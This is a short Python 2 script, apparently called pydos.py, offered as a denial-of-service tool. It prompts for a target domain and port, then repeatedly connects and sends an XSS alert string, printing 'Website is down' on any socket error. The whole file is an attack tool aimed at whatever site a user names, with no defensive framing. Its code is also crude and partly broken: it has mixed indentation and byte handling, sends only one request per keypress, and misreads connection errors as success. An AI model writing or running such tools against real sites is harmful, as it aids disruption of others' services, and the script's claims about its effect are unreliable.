import socket
import sys
import time
import os
import subprocess

def restart_program():
    subprocess.call(['python', 'pydos.py'])

msg="<script>alert('XSS')</script>"
target=raw_input('Enter domain name only: ')
ip=socket.gethostbyname(target)
port=raw_input('Enter port: ')
print "Target IP = " + ip
print "DOSing " + target + ", please be patient"

def dos():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, int(port)))
        s.send(bytes(msg.encode()))
        s.sendto(bytes(msg.encode()), (ip, int(port)))
        s.send(msg)
    except socket.error:
        print "Website is down"
    s.close()
while True:
    dos()
    print "Type \'c' to stop DOSing"
    if raw_input() == "c":
        break
if __name__ == "__main__":
    print "DOS more?(y/n): "
    answer=raw_input()
    if answer == "y":
        restart_program()
    elif answer == "n":
        print "Bye"
	time.sleep(3)
	sys.exit(0)
    else:
	print "Unknown syntax, closing program"
	time.sleep(3)
	sys.exit(0)
